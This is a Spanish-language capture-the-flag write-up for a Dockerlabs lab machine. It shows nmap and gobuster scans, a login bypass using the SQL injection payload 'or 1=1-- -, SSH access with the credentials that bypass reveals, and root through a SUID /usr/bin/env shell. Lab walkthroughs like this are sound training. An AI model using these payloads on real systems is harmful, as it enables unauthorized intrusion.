# Máquina Injection
- Dificultad: muy fácil

## Escaneo con nmap
<p>Realizamos un escaneo de puertos, servicios y versiones con el siguiente comando.</p>

```
nmap -sCV -sS -n -Pn -p- 172.17.0.2

```

```
Nmap scan report for 172.17.0.2
Host is up (0.000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Iniciar Sesi\xC3\xB3n
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
<p>El puerto 22 y el 80 estan abiertos con los servicios SSH y Apache, primero revisamos el servicio web y utilizamos gobuster para buscar posibles directorios.</p>

## Gobuster

```
 gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,py

```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 2921]
/.html                (Status: 403) [Size: 275]
/config.php           (Status: 200) [Size: 0]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================


```
<p>Encontramos dos archivos php, en config.php no encontré nada asi que revisamos el index.php.</p>

![captura-login](https://github.com/JavierKJ4/Dockerlabs/blob/main/recursos/Screenshot_2024-05-13_04-20-49.png)


<p>Probamos una inyección SQL simple colocando 'or 1=1-- - en el nombre de usuario y cualquier cosa en la contraceña.</p>

![captura-loginhack](https://github.com/JavierKJ4/Dockerlabs/blob/main/recursos/Screenshot_2024-05-13_04-21-37.png)

<p>Logramos logearnos y  vemos que hay un usuario y una contraseña, los usamos en el ssh.</p>

![captura-logeado](https://github.com/JavierKJ4/Dockerlabs/blob/main/recursos/Screenshot_2024-05-13_04-22-21.png)

## SSH

```
ssh 172.17.0.2 -l dylan

```
<p>Nos pide la contraceña, la escribimos y estamos dentro.</p>

```
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:5ic4ZXizeEb8agR4jNX59cBONCe5b5iEcU9lf2zt0Q0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.6.9-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dylan@a83a137e0699:~$ 

```

## Escalando privilegios

<p>Buscamos binarios con permisos SUID.</p>

```
find / -perm -4000 -user root 2>/dev/null

```

```
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/su
/usr/bin/env
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
```

<p>Aparece el binario /usr/bin/env asi que ejecutamos el sigiente comando desde la raiz del sistema y estamos como root.</p>

```
./usr/bin/env /bin/sh -p

```

```
# whoami
root
# 
```
